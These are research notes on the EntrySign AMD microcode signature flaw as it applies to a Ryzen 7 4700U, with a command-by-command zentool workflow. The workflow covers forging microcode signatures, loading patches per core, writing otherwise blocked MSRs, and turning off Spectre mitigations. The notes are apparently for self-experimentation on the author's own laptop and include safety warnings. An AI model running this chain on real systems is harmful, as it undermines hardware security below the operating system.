# EntrySign / CVE-2024-56161: Research Notes for AMD Ryzen 7 4700U

**Repo:** pocket-lab-v2-6  
**CPU:** AMD Ryzen 7 4700U (Renoir, CPUID `0x08600601`, microcode revision `0x860010d`)  
**Document status:** Research / working notes  
**Date:** 2026-04-25

---

## Table of Contents

1. [What EntrySign Is](#1-what-entrysign-is)
2. [4700U Applicability](#2-4700u-applicability)
3. [SMT and the 4700U — Clearing Up the Misconception](#3-smt-and-the-4700u--clearing-up-the-misconception)
4. [What CAN Be Done With EntrySign on the 4700U](#4-what-can-be-done-with-entrysign-on-the-4700u)
5. [zentool Workflow for the 4700U](#5-zentool-workflow-for-the-4700u)
6. [Prerequisites on This Machine](#6-prerequisites-on-this-machine)
7. [Security and Stability Warnings](#7-security-and-stability-warnings)
8. [What the Match Register Data Tells Us](#8-what-the-match-register-data-tells-us)
9. [Conclusion](#9-conclusion)

---

## 1. What EntrySign Is

**EntrySign** is a vulnerability in AMD's CPU microcode update signature verification, disclosed publicly on February 3, 2025, with full technical details and tooling published on March 5, 2025.

- **CVE:** CVE-2024-56161
- **AMD bulletins:** AMD-SB-3019, AMD-SB-7033
- **CVSS 3.1:** 7.2 High (`AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N`)
- **Discoverers:** Josh Eads, Kristoffer Janke, Eduardo Vela, Tavis Ormandy, and Matteo Rizzo — Google Hardware Security Team
- **Reported to AMD:** September 25, 2024
- **Fix delivered to OEMs:** December 17, 2024
- **Public disclosure:** February 3, 2025
- **Tools and full details released:** March 5, 2025

### The Cryptographic Root Cause

AMD's microcode patch loader verifies patch authenticity using a two-step process:

1. A hash of the RSA public key embedded in the patch header is computed.
2. A hash of the patch content itself is computed.

Both hashes use **AES-CMAC** (Cipher-based Message Authentication Code, RFC 4493). This is the flaw. CMAC is a message authentication code — it was designed to verify that a known party sent a message, using a shared secret. It was not designed to be a collision-resistant hash function.

The fundamental weakness of using CMAC as a hash:

> "Anyone who has the encryption key is able to observe the intermediate values of the encryption and calculate a way to 'correct' the difference so that the final output remains the same, even if the inputs are completely different." — [oss-sec disclosure, Alexander/Google, March 5, 2025](https://seclists.org/oss-sec/2025/q1/176)

A proper secure hash function (SHA-256, SHA-3, etc.) has no secret key and provides no leverage to an adversary who knows intermediate state. CMAC provides neither guarantee when the key is known.

### The Key Was Already Public

The AES-CMAC key used by AMD from Zen 1 through at least Zen 4 is the **NIST SP 800-38B Appendix D.1 example key**:

```
2b 7e 15 16  28 ae d2 a6  ab f7 15 88  09 cf 4f 3c
```

This is a test vector published in the NIST standard itself. AMD reused it as a production signing key, which means the key was recoverable from a public document without any hardware attack. Researchers confirmed this by extracting it from an old Zen 1 part and cross-referencing with NIST publication tables.

Because every Zen 1–4 CPU must carry the same CMAC key (the key is what allows any AMD-signed patch to be accepted by any CPU of the same generation), recovering the key from a single chip compromises all other chips using the same key.

### What the Exploit Enables

With the known CMAC key, an attacker with **ring-0 access** (local kernel privilege, from outside a VM) can:

- Forge the hash of an arbitrary RSA public key so it collides with AMD's authentic key hash
- Forge the hash of an arbitrary microcode patch body
- Produce a patch binary that the CPU accepts as AMD-signed
- Load that patch using the standard `wrmsr 0x79` / `/dev/cpu/N/msr` mechanism

The result is **arbitrary microcode execution** on the target core.

### Affected Microarchitectures

| Microarchitecture | Affected | Notes |
|---|---|---|
| Zen 1 (Naples, Summit Ridge) | Yes | NIST key confirmed |
| Zen 2 (Rome, Matisse, Renoir) | Yes | Same NIST key |
| Zen 3 (Milan, Vermeer, Cezanne) | Yes | Same NIST key |
| Zen 4 (Genoa, Raphael, Phoenix) | Yes | Same NIST key through at least Zen 4 |
| Zen 5 (Turin, Strix) | Yes (later) | Different key; recovered March 7, 2025; added to advisory April 7, 2025 |

The initial advisory stated Zen 5 was unaffected. Google's team recovered the Zen 5 CMAC key on March 7, 2025 and AMD added Zen 5 to the advisory on April 7, 2025. The Zen 5 key is distinct from the Zen 1–4 key.

### Patch Status

AMD's fix replaces AES-CMAC with a custom secure hash function in the microcode validation routine and pairs it with an AMD Secure Processor (PSP) firmware update that ensures the new validation routine is in place before any x86 core can attempt to load a microcode patch. The RenoirPI-FP6 fix is `1.0.0.Eb` (released 2025-01-14). Any system running BIOS firmware incorporating that PSP update will reject EntrySign-forged patches.

Patches loaded to volatile microcode RAM do not survive a power cycle regardless.

---

## 2. 4700U Applicability

### CPU Identity

| Field | Value |
|---|---|
| Marketing name | AMD Ryzen 7 4700U |
| Codename | Renoir (Grey Hawk mobile) |
| Socket | FP6 |
| Microarchitecture | Zen 2 |
| CPUID (full) | `0x08600601` |
| CPUID (short, as shown in zentool) | `0x00008601` |
| Family | 23 (0x17) |
| Extended Family | 8 |
| Extended Model | 6 |
| Model | 0 |
| Stepping | 1 |
| Core count | 8 |
| Thread count | 8 (no SMT — see Section 3) |
| TDP | 15 W |
| Process node | 7 nm (TSMC) |

CPUID `0x08600601` decodes as: ExtFam=8, ExtModel=6, BaseFamily=F, Stepping=1. In AMD's notation this is Family 23, Model 96, Stepping 1. zentool renders this as `00008601` (dropping the upper byte of the extended family field in its short display).

### Microcode Binary

The microcode file for this CPU in the CPUMicrocodes collection is:

```
cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin
```

The filename encodes:
- `cpu00860F01` — CPUID selector `0x00860F01` (matches stepping 1 of Family 23h Model 60h, i.e. Renoir stepping 1)
- `ver0860010F` — patch revision `0x0860010F`
- `2024-11-18` — release date
- `785D74AB` — checksum

Running `zentool print` on this file confirms:

```
Date:       11182024 (Mon Nov 18 2024)
Revision:   0860010f
Format:     8004
Patchlen:   00
Init:       00
Checksum:   00000000
NorthBridge: 0000:0000
SouthBridge: 0000:0000
Cpuid:      00008601  AMD Ryzen (Grey Hawk, Renoir)
  Stepping 1
  Model: 0
  Extmodel: 6
  Extfam: 8
BiosRev:    00
Flags:      00
Reserved:   0000
Signature:  9c... (GOOD)
Autorun:    false
Encrypted:  false
Revision:   0860010f (Signed)
```

The patch is not encrypted (the `Encrypted: false` field), which means it can be directly disassembled and edited without a prior decrypt step. This is relevant to the workflow in Section 5.

### Match Register File

The zentool data directory ships `cpu8601_matchreg.json` — a file mapping ROM addresses to x86 instruction identities for CPUID `0x8601`. This file exists and is non-empty, meaning the match register layout for the 4700U has been mapped. zentool can use it to target patches at specific x86 instructions on this CPU using symbolic references (e.g., `--match 0,1=@fpatan`).

### Conclusion on Applicability

The 4700U is fully within the EntrySign attack surface:

- It is a Zen 2 CPU.
- Its BIOS firmware (pre-2025-01-14 RenoirPI-FP6 1.0.0.Eb) uses the broken CMAC verification.
- Its microcode binary is available and unencrypted.
- Its match register map exists in zentool's data.
- zentool's README uses `cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin` as its **primary worked example** — this is literally the 4700U microcode file.

---

## 3. SMT and the 4700U — Clearing Up the Misconception

### The Kernel Report

On this system, `/sys/devices/system/cpu/smt/control` reads `notsupported`. This is accurate. The kernel is not lying or enforcing a software policy — it is reporting the hardware state.

### Why the 4700U Has No SMT

The Ryzen 7 4700U is an 8-core, 8-thread part. It has **no Simultaneous Multi-Threading** capability. This was a deliberate silicon-level decision by AMD for the Renoir-U lineup:

- The Ryzen 7 **4800U** has 8 cores and **16 threads** (SMT enabled).
- The Ryzen 7 **4700U** has 8 cores and **8 threads** (SMT not present).

The physical thread-sibling execution units do not exist in the 4700U die. AMD binned or configured the Renoir silicon to exclude the second hardware thread context per core in this SKU, likely for power envelope and yield management reasons within the 15 W TDP target. This is a hardware property, not a kernel configuration, a BIOS option, or a microcode flag that can be toggled.

The Linux kernel's `notsupported` response to `smt/control` means the CPU reports no SMT topology to the OS — there are no thread siblings. Compare: a CPU that has SMT but has it disabled in firmware or via `nosmt` kernel parameter would instead show `off` (can be re-enabled) or `forceoff`.

### What EntrySign Cannot Do Here

EntrySign allows loading arbitrary microcode. Microcode can:

- Alter the behavior of x86 instructions handled via microcode ROM
- Read and write Model-Specific Registers (MSRs), including those normally blocked by the privilege layer
- Execute sequences of internal load/store/ALU operations against internal CPU state

Microcode cannot:

- Instantiate hardware execution units that do not exist on the die
- Create additional hardware thread contexts in a core that was never built with them
- Unlock an architectural feature that has no silicon backing

There is no "SMT enable" bit in a Zen 2 core's MSR space that, when set, causes sibling hardware threads to materialize. The `smt/control` interface on Linux gates access to hardware that already exists; it has no meaning on a part where the hardware was never built.

**The 4700U cannot have SMT unlocked via EntrySign, via any MSR write, or by any software means.** This is a silicon-level constraint, not a firmware or software lock.

---

## 4. What CAN Be Done With EntrySign on the 4700U

The absence of SMT does not make this CPU uninteresting for microcode research. The following capabilities are real and available.

### 4.1 Custom Instruction Behavior (Microcoded Instructions)

A subset of x86 instructions are implemented entirely in microcode ROM — meaning when the CPU's front-end encounters them, it does not decode them directly into micro-ops but instead branches into a microcode sequence. Examples that are patchable on Zen 2 include:

- `rdrand` — hardware random number generation
- `fpatan` — x87 floating-point arctangent
- `cmpxchg` — compare and exchange (atomic)
- `lock cmpxchg` — locked form of compare and exchange
- `cmpxchg8b` — compare and exchange 8 bytes
- `rdtsc` — read timestamp counter
- `wrmsr` / `rdmsr` — MSR access instructions (partially microcoded)

A custom patch can replace the microcode body of any of these instructions with an arbitrary sequence. The RDRAND proof-of-concept from the Google repository demonstrates this by making `rdrand` return a constant value (4 in the original Milan/Genoa PoC).

### 4.2 MSR Read/Write Without Privilege Checks

Normal kernel code accesses MSRs via `wrmsr`/`rdmsr`. These instructions are themselves microcoded and their implementations include privilege and filter logic — some MSRs are read-only, some are write-only, some are filtered entirely.

Microcode executing inside a patch runs at a level below these checks. The patch has direct access to the `ms:` segment (internal MSR address space). Using `ld.p ms:[addr], reg` (a non-faulting store to MSR space), a patch can write to MSRs that `wrmsr` would GP-fault on.

From the zentool reference, `MSR_AMD64_PATCH_LEVEL` (the microcode revision MSR, `0x8b`) is at `ms:0x262`. The address mapping for other MSRs is not fully documented and must be discovered experimentally, but the mechanism is confirmed.

Example microcode that writes `0x41` to the patch level MSR:

```
mov rax, rax, 0x262
mov rbx, rbx, 0x41
ld.p ms:[rax], rbx
```

This is the mechanism used in the basic zentool demo — after loading a patch that sets the revision to `0x8600141`, `rdmsr -a 0x8b` shows the new value on the patched core only, while unpatched cores still show the original AMD value.

### 4.3 Patching Security Mitigations

Spectre retpolines, IBPB (Indirect Branch Predictor Barrier), SSBD (Speculative Store Bypass Disable), and related mitigations are partly implemented or enabled through microcode-controlled MSRs (e.g., `SPEC_CTRL` at `0x48`, `PRED_CMD` at `0x49`). A custom patch that NOP-sleds the relevant microcode sequences or writes specific bits into these MSRs can effectively disable the mitigations on targeted cores.

This is listed here for completeness. Doing so on a production system creates actual security exposure. Any experimentation with mitigation disabling should be done on an isolated, offline core with no privileged processes.

### 4.4 Per-Core Patch Deployment

Microcode patches are loaded per-core via `zentool load --cpu=N`. Different cores can carry different patches simultaneously. A patch applied to CPU 2 has no effect on CPUs 0, 1, 3, etc. This makes it practical to:

- Leave primary compute cores unmodified
- Load experimental patches to one or two isolated cores
- Use `taskset -c N` to pin test processes to the patched core

### 4.5 Volatile Patch RAM Only

Microcode patch storage is in SRAM local to each core. This RAM is reset on power cycle. There is no mechanism in the standard zentool workflow to make patches persistent across reboots. Every session requires reloading patches.

This also means a failed experiment is recoverable by rebooting.

### 4.6 Physical Memory Access via `ls:` Segment

The `ls:` segment in microcode refers to the linear virtual address space visible from the current process context. From within a microcode patch, loads and stores to `ls:` can read and write to virtual memory addresses. Because patches are loaded from ring-0, the accessible address space includes physical memory mapped via the kernel's direct map (`/proc/kcore`, page frame addresses, etc.). The `ps:` segment provides direct physical address access.

The Hacker News discussion on the zentool release noted that the `tests/stop.sh` test exercises various segment accesses (`ls:`, `ms:`, numeric segment specifiers `0:`–`15:`), and that some of these segments likely reach flash or other persistent storage — though that capability requires further mapping work.

### 4.7 The RDRAND Demonstration

The RDRAND PoC shipped in the Google security-research repository is the canonical safe demonstration of the capability. It patches the microcode body of the `rdrand` instruction to return a constant, verifiable value rather than a hardware random number. This:

- Proves the patch loaded and executed
- Is detectable by running `rdrand` on the patched core and observing the predictable output
- Does not modify any security-critical MSR
- Does not alter instruction semantics in a way that threatens system stability
- Is fully undone by reboot

This is the recommended first test on the 4700U.

---

## 5. zentool Workflow for the 4700U

### 5.1 Locate the Microcode Binary

The file is in the CPUMicrocodes collection (e.g., from upstream linux-firmware or the ucode-intel/AMD repositories):

```
cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin
```

Verify the CPUID matches before proceeding:

```sh
zentool print cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin
```

Expected output (abbreviated):

```
Cpuid:    00008601  AMD Ryzen (Grey Hawk, Renoir)
Revision: 0860010f (Signed)
Encrypted: false
```

The `Encrypted: false` line confirms no decryption step is needed.

### 5.2 Decrypt (Not Required for This File)

If the file were encrypted, the workflow would include:

```sh
zentool decrypt cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin
```

For the 4700U binary, skip this step.

### 5.3 Create a Working Copy and Modify the Revision

Copy to a working file and bump the revision. The patch level must be higher than the CPU's current revision for the loader to accept it (the CPU rejects downgrades):

```sh
zentool --output working.bin edit \
    --hdr-revision 0x8600141 \
    cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin
```

At this point `zentool verify working.bin` reports `BAD` because the signature no longer matches the modified content.

### 5.4 Resign

This is the exploit step. zentool uses the recovered NIST CMAC key to forge a valid signature for the modified binary:

```sh
zentool resign working.bin
```

After resigning:

```sh
zentool verify working.bin
# working.bin: GOOD
```

The CPU cannot distinguish this from a legitimate AMD signature because both use the same broken CMAC scheme with the same key.

### 5.5 Create a Targeted Instruction Patch

To patch a specific instruction (e.g., `fpatan`), use the match register mechanism:

```sh
zentool edit --nop all \
             --match all=0 \
             --match 0,1=@fpatan \
             --seq 0,1=7 \
             --insn q1i0="xor rax, rax, rax" \
             --insn q1i1="add rax, rax, 0x1337" \
             --hdr-revlow 0xff \
             working.bin
```

Breaking down the flags:

| Flag | Meaning |
|---|---|
| `--nop all` | Zero out all existing instruction quads |
| `--match all=0` | Clear all match registers (patch applies to nothing by default) |
| `--match 0,1=@fpatan` | Set match registers 0 and 1 to the ROM address of `fpatan` |
| `--seq 0,1=7` | Set the sequence field for quads 0 and 1 |
| `--insn q1i0=...` | Set instruction 0 of quad 1 |
| `--insn q1i1=...` | Set instruction 1 of quad 1 |
| `--hdr-revlow 0xff` | Set the low byte of the header revision |

Then resign:

```sh
zentool resign working.bin
```

### 5.6 Load the Patch

Requires root. The `--cpu=N` argument specifies the CPU core (logical processor number, as shown in `/proc/cpuinfo`):

```sh
sudo zentool load --cpu=2 working.bin
```

Only core 2 receives the patch. Other cores are unaffected.

### 5.7 Verify the Patch Loaded

Check the microcode revision MSR on all cores:

```sh
rdmsr -a 0x8b
```

Expected output: all cores except core 2 show the original AMD revision (`0x860010d` or similar). Core 2 shows the patched revision (e.g., `0x8600141` or whatever was set in `--hdr-revision`).

### 5.8 Test Patched Instruction

Pin a process to the patched core and run the modified instruction:

```sh
taskset -c 2 ./test_fpatan
```

If the patch replaced `fpatan` with `xor rax, rax, rax; add rax, rax, 0x1337`, the `rax` register should contain `0x1337` after `fpatan` executes.

### 5.9 Assemble Custom Microcode with mcas

For more complex patches, use the `mcas` assembler included in the zentool suite:

```sh
echo "ld ls:[rax], rsi" | ./mcas
```

Output is the 8-byte opcode quad that can be passed to `--insn`. The companion disassembler `mcop` goes the other direction:

```sh
./mcop 382E9C1108081337
```

### 5.10 MSR Write Example

To write an arbitrary value to an MSR address via microcode (use with care — see Section 7):

```sh
zentool edit --nop all \
             --match all=0 \
             --insn q0i0="mov rax, rax, 0x262" \
             --insn q0i1="mov rbx, rbx, 0x41" \
             --insn q0i2="ld.p ms:[rax], rbx" \
             working.bin
zentool resign working.bin
sudo zentool load --cpu=3 working.bin
```

This writes `0x41` to `ms:0x262` (the patch level MSR) on core 3.

---

## 6. Prerequisites on This Machine

| Requirement | Status | Notes |
|---|---|---|
| Secure Boot | Disabled | Confirmed. Secure Boot blocks unsigned kernel modules and would interfere with some loading paths. |
| Root access | Yes (sudo) | Required for `zentool load` and MSR reads via `rdmsr`. |
| zentool binary | Present | Compiled in repo. |
| mcas / mcop | Present | Part of the zentool suite. |
| Microcode binary | Present | `cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin` in CPUMicrocodes directory. |
| `iomem=relaxed` | Added to GRUB | Takes effect after next reboot. Required for `rdmsr`/`wrmsr` via userspace MSR tools when the kernel enforces strict iomem. |
| Kernel version | 7.0 | **Needs testing.** Later kernels may enforce restrictions on loading microcode updates via `/dev/cpu/N/msr` (the `wrmsr 0x79` path). If zentool load fails with EPERM or EIO, check dmesg and consider whether the kernel has hardened the MSR write path. The `msr` kernel module must be loaded (`modprobe msr`). |
| `msr` kernel module | Unknown | Verify with `lsmod | grep msr`. If absent, `sudo modprobe msr`. |

### Kernel Microcode Load Path

zentool uses the MSR write mechanism: it opens `/dev/cpu/N/msr` and writes the patch binary address to MSR `0x79` (`MSR_AMD64_PATCH_LOADER`). The kernel must have the `msr` module loaded and `/dev/cpu/*/msr` devices accessible to root. On kernels with `CONFIG_X86_MSR_FILTER`, additional checks may apply — test and verify before assuming the load will succeed.

---

## 7. Security and Stability Warnings

### Microcode Patches Are Volatile and Per-Core

- Patches reside in volatile SRAM. A power cycle (not just a warm reboot in all cases) clears them.
- Only the targeted core (`--cpu=N`) is modified. All other cores run unmodified AMD microcode.
- Verification via `rdmsr -a 0x8b` confirms which cores are patched before running any tests.

### Wrong Patches Cause Kernel Panics or Silent Corruption

Microcode runs below all OS protection rings. A syntactically valid but semantically broken patch can:

- Cause a general protection fault (#GP) or machine check exception (#MC) that panics the kernel
- Silently return wrong values for the patched instruction (silent data corruption)
- Deadlock the core if the microcode sequence does not terminate cleanly

The AngryUEFI project (39C3 presentation) built a recovery mechanism for exactly this scenario. Without it, a bad patch on a core means that core is unusable until reboot. Plan test cycles around this.

### Never Patch Cores Running Critical Processes

Use `taskset`, CPU affinity, and `isolcpus` kernel parameters to ensure the patched cores are idle and not servicing interrupt handlers, kernel threads, or critical userspace daemons. On an 8-core machine, isolating cores 6 and 7 for experimentation leaves 6 cores for normal operation.

### Mitigation Patching Is Dangerous

Disabling Spectre (IBPB, STIBP, SSBD) or other CPU security mitigations via microcode MSR writes on cores that then run any untrusted or networked code creates real attack surface. The mitigations exist for documented, exploitable vulnerabilities. Only disable on a core you have fully isolated and that processes no external data.

### The RDRAND Patch Is Safe for Testing

The RDRAND demonstration does not alter any MSR, does not affect other instructions, and does not touch security state. The worst outcome is that code running `rdrand` on the patched core gets a predictable value instead of a random one. This is detectable and recoverable. Use it as the initial proof-of-concept.

### Interaction With AMD PSP

The AMD Platform Security Processor (PSP) may perform independent attestation or logging. On patched firmware (RenoirPI-FP6 1.0.0.Eb or later), the PSP validates the microcode before x86 cores see it and will reject forged patches. On older BIOS firmware, the x86 core validates the patch itself using the broken CMAC scheme. Know which BIOS version is running before expecting zentool load to succeed.

---

## 8. What the Match Register Data Tells Us

### How Match Registers Work

Each microcode patch contains a set of match registers. When the CPU's microcode dispatch logic encounters an x86 instruction, it computes an address derived from the instruction encoding and checks it against the patch's match registers. If a match register contains the address corresponding to the incoming instruction, the CPU routes execution to the patch's instruction body at that match slot instead of the ROM sequence.

The `cpu8601_matchreg.json` file in zentool's data directory maps these ROM addresses to named x86 instructions for CPUID `0x8601` (the 4700U). This mapping was produced by reverse engineering the match register encoding on a Renoir CPU.

### Known Mapped Instructions for CPUID 0x8601

The zentool `print --match-regs` output for the Renoir microcode binary lists 22 populated match register slots. Based on the zentool data and the known instruction set for Zen 2, the mapped microcoded instructions include (non-exhaustive):

| Instruction | Notes |
|---|---|
| `cmpxchg` | Compare and exchange |
| `lock cmpxchg` | Locked atomic form |
| `cmpxchg8b` | 8-byte compare and exchange |
| `rdtsc` | Read timestamp counter |
| `rdrand` | Hardware RNG |
| `fpatan` | x87 arctangent (used in zentool demo) |
| `wrmsr` / `rdmsr` | MSR access (partially microcoded) |

The match register file allows zentool to target patches symbolically (e.g., `--match 0,1=@rdrand`) without manually computing the ROM address. Instructions not in the JSON file are either handled by the fast-path decoder (not microcoded) or have not yet been reverse-engineered.

### Absence of SMT Control Instructions

SMT thread management on AMD Zen CPUs that support it is handled at the core fabric level and through hardware topology — it is not implemented as a microcoded instruction. There is no `enable_smt` or equivalent entry in the match register map for the 4700U or any other Zen 2 part. This is further hardware evidence that SMT state cannot be reached through the microcode patch mechanism, independent of the silicon absence argument made in Section 3.

---

## 9. Conclusion

### What Is Confirmed

| Claim | Status |
|---|---|
| EntrySign (CVE-2024-56161) applies to Zen 2 | Confirmed |
| 4700U is Zen 2, CPUID `0x8601` | Confirmed |
| `cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin` is the correct microcode file | Confirmed |
| Match register map for 0x8601 exists in zentool | Confirmed |
| zentool uses this exact file as its primary demo | Confirmed |
| BIOS with RenoirPI-FP6 < 1.0.0.Eb is vulnerable | Confirmed |
| Patches are volatile (cleared on power cycle) | Confirmed |
| Ring-0 access required | Confirmed |

### What Is Not Possible

| Claim | Status |
|---|---|
| SMT unlock via EntrySign | Not possible — hardware lacks thread siblings |
| Persistent patches across power cycles | Not possible — patch SRAM is volatile |
| Patching without ring-0 | Not possible — requires kernel MSR write access |
| Patching a system with updated BIOS (RenoirPI 1.0.0.Eb+) | Not possible without BIOS downgrade |

### Recommended Experiment Order

1. Confirm `msr` module is loaded: `modprobe msr`
2. Confirm current microcode revision: `rdmsr -a 0x8b`
3. Run a null patch (revision bump only, no instruction changes): load `working.bin` with `--hdr-revision 0x8600141` and verify `rdmsr -a 0x8b` shows the new value on the target core
4. Run the RDRAND PoC to confirm instruction patching works
5. Explore match register enumeration for other instructions using `zentool print --match-regs`
6. Only then attempt MSR manipulation, on an isolated core with no concurrent workloads

### Attack Surface Summary

The interesting research surface on this machine is:

- **MSR manipulation** below the kernel's visibility (write to MSRs that `wrmsr` blocks)
- **Custom instruction behavior** for any microcoded x86 instruction in the 4700U's match register map
- **Security mitigation probing** — verify which mitigations are controlled through microcode-accessible paths (do not disable on production cores)
- **Internal CPU state observation** — load, execute, and read from `ls:` and `ms:` segments to map internal CPU state that is normally inaccessible

All experiments should be performed on cores isolated from primary compute workloads. Core isolation via `isolcpus=6,7` (or equivalent) in the kernel command line is the minimum precaution.

---

## References

| Resource | URL |
|---|---|
| Google security advisory (GHSA-4xq7-4mgh-gp6w) | https://github.com/google/security-research/security/advisories/GHSA-4xq7-4mgh-gp6w |
| AMD-SB-7033 (product bulletin) | https://www.amd.com/en/resources/product-security/bulletin/amd-sb-7033.html |
| NVD CVE-2024-56161 | https://nvd.nist.gov/vuln/detail/CVE-2024-56161 |
| zentool README | https://github.com/google/security-research/blob/master/pocs/cpus/entrysign/zentool/README.md |
| zentool reference (MSR, segments) | https://github.com/google/security-research/blob/master/pocs/cpus/entrysign/zentool/docs/reference.md |
| oss-sec disclosure (CMAC details, NIST key) | https://seclists.org/oss-sec/2025/q1/176 |
| Tom's Hardware coverage | https://www.tomshardware.com/pc-components/cpus/you-can-now-jailbreak-your-amd-cpu-google-researchers-release-kit-to-exploit-microcode-vulnerability-in-zen-1-to-zen-4-chips |
| 39C3 talk: "The Angry Path to Zen" | https://events.ccc.de/congress/2025/hub/de/event/detail/the-angry-path-to-zen-amd-zen-microcode-tools-and-insights |
| Notebookcheck 4700U specs | https://www.notebookcheck.net/AMD-Ryzen-7-4700U-Laptop-Processor-Benchmarks-and-Specs.449976.0.html |
| NIST SP 800-38B (AES-CMAC standard with example key) | https://csrc.nist.gov/publications/detail/sp/800-38b/final |
